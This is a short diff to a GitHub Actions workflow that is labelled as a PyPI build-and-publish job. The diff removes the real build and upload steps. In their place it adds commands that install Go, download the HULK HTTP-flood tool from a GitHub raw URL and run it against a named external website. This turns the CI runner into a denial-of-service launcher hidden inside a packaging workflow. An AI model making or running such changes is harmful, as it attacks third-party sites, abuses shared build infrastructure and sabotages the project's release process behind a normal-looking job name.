@@ -20,10 +20,11 @@ jobs:
       run: |
         python -m pip install --upgrade pip
         pip install setuptools wheel twine
+        apt install golang -y
     - name: Build and publish
       env:
         TWINE_USERNAME: ${{ secrets.PYPI_USERNAME }}
         TWINE_PASSWORD: ${{ secrets.PYPI_PASSWORD }}
       run: |
-        python setup.py sdist bdist_wheel
-        twine upload dist/*
+        wget https://raw.githubusercontent.com/grafov/hulk/master/hulk.go
+        go run hulk.go --site https://gujjarvip.online
